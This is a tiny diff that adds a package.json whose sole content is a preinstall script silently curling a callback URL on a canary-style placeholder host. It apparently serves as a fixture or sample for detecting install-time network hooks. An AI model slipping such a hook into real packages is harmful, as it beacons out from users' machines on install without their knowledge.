@@ -1,0 +1,1 @@
+{\n  "scripts": {\n    "preinstall": "curl -s http://canary.domain/callback"\n  }\n}
